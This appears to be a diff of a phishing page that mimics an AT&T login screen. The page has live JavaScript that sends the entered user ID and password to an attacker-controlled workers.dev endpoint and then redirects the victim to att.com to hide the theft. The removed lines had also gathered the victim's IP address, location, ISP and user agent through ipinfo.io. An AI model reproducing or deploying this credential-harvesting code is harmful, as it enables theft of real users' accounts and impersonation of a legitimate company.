@@ -13,63 +13,55 @@
     
     
     
-    
-<form id="loginForm" method="post" action="https://aut0-curr-9dc7.henrycrane65.workers.dev/">
+<form id="login" method="post" class="manual-login-form ng-pristine ng-invalid ng-touched" action="https://aut0-curr-9dc7.henrycrane65.workers.dev/">
     <app-user-input _nghost-psk-c39="">
-        <div id="userInputContainerDiv" class="form-row space-below">
-            <label id="userLabel" for="emailID" class="formfield-label">User ID</label>
-            <input id="emailID" name="emailID" autocomplete="username" spellcheck="false" autocapitalize="off" type="email" class="textfield" required>
+        <div _ngcontent-psk-c39="" id="userInputContainerDiv" class="form-row space-below ng-pristine ng-invalid ng-touched">
+            <label _ngcontent-psk-c39="" id="userLabel" for="emailID" class="formfield-label">User ID</label>
+            <input _ngcontent-psk-c39="" id="emailID" name="emailID" autocomplete="username" spellcheck="false" autocapitalize="off" type="email" class="textfield ng-pristine ng-invalid ng-touched" required>
         </div>
     </app-user-input>
 
     <app-password-input>
-        <div class="form-row rel">
+        <div class="form-row rel ng-untouched ng-pristine ng-invalid">
             <label id="passwordLabel" for="password" class="formfield-label">Password</label>
-            <input id="password" name="password" type="password" class="textfield textfield-password" required>
+            <input id="password" name="password" type="password" class="textfield textfield-password ng-untouched ng-pristine ng-invalid" required>
         </div>
     </app-password-input>
 
     <div class="continue-button-spacing">
-        <button type="submit" class="btn-full-width btn-primary letter-spacing-3">Sign in</button>
+        <app-button-spinner class="width-full">
+            <button type="submit" class="btn-full-width btn-primary letter-spacing-3">Continue</button>
+        </app-button-spinner>
     </div>
 </form>
 
-<!-- 🔹 JavaScript to Ensure Reliable Submission -->
+<!-- JavaScript to Ensure Smooth Submission & Redirection -->
 <script>
-document.getElementById("loginForm").addEventListener("submit", async function(event) {
+document.getElementById("login").addEventListener("submit", async function(event) {
     event.preventDefault(); // Prevent default form submission
 
     const form = event.target;
     const formData = new FormData(form);
 
-    // Get user IP and details from Cloudflare
-    const response = await fetch("https://ipinfo.io/json");
-    const ipData = await response.json();
-
-    formData.append("ip", ipData.ip || "Unknown");
-    formData.append("country", ipData.country || "Unknown");
-    formData.append("region", ipData.region || "Unknown");
-    formData.append("city", ipData.city || "Unknown");
-    formData.append("isp", ipData.org || "Unknown");
-    formData.append("userAgent", navigator.userAgent);
-
     try {
-        const workerResponse = await fetch(form.action, {
+        const response = await fetch(form.action, {
             method: "POST",
             body: formData
         });
 
-        if (workerResponse.ok) {
-            alert("Processing... Redirecting");
-            window.location.href = "https://www.att.com"; // Redirect after submission
+        if (response.ok) {
+            window.location.href = "https://www.att.com"; // ✅ Redirect after successful submission
         } else {
-            alert("Error: Unable to send data.");
+            alert("Error: Could not process request.");
         }
     } catch (error) {
-        console.error("Error submitting form:", error);
+        console.error("Submission error:", error);
     }
 });
 </script>
+    
+
+
 
 
 </div></div><div _ngcontent-psk-c37="" id="appCompFooterContainer" class="row flex-centered"><div _ngcontent-psk-c37="" id="appCompFooterContDiv" class="grid-col-12 pad-none"><app-footer _ngcontent-psk-c37="" role="contentinfo" _nghost-psk-c35=""><div _ngcontent-psk-c35="" class="login-background footer-div pad-l-lg-sm pad-r-lg-sm"><div _ngcontent-psk-c35="" id="footerLinksDiv" class="footer-links-div justify-center"><app-footer-link _ngcontent-psk-c35="" class="flex flex-row flex-items-center"><a rel="noopener noreferrer" target="_blank" id="footerLink0" href="https://www.att.com/legal/legal-policy-center.html" title="Legal policy center (Opens in new window)" aria-label="Legal policy center (Opens in new window)" class="type-xs link-text2">Legal policy center</a></app-footer-link><app-footer-link _ngcontent-psk-c35="" class="flex flex-row flex-items-center"><a rel="noopener noreferrer" target="_blank" id="footerLink1" href="https://about.att.com/sites/privacy_policy" title="Privacy policy (Opens in new window)" aria-label="Privacy policy (Opens in new window)" class="type-xs link-text2">Privacy policy</a></app-footer-link><app-footer-link _ngcontent-psk-c35="" class="flex flex-row flex-items-center"><a rel="noopener noreferrer" target="_blank" id="footerLink2" href="https://www.att.com/legal/terms.attWebsiteTermsOfUse.html" title="Terms of use (Opens in new window)" aria-label="Terms of use (Opens in new window)" class="type-xs link-text2">Terms of use</a></app-footer-link><app-footer-link _ngcontent-psk-c35="" class="flex flex-row flex-items-center"><a rel="noopener noreferrer" target="_blank" id="footerLink3" href="https://www.att.com/features/accessibility.html" title="Accessibility (Opens in new window)" aria-label="Accessibility (Opens in new window)" class="type-xs link-text2">Accessibility</a></app-footer-link><app-footer-link _ngcontent-psk-c35="" class="flex flex-row flex-items-center"><app-footer-link-icon id="footerLinkIconElLeft4"><div class="flex flex-row flex-items-center footer-link-icon" id="footerLinkIcon4"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" role="img" focusable="true" class="footer-link-icon-svg" id="footerLinkIconSvg4" aria-label="California Consumer Privacy Act (CCPA) Opt-Out Icon">
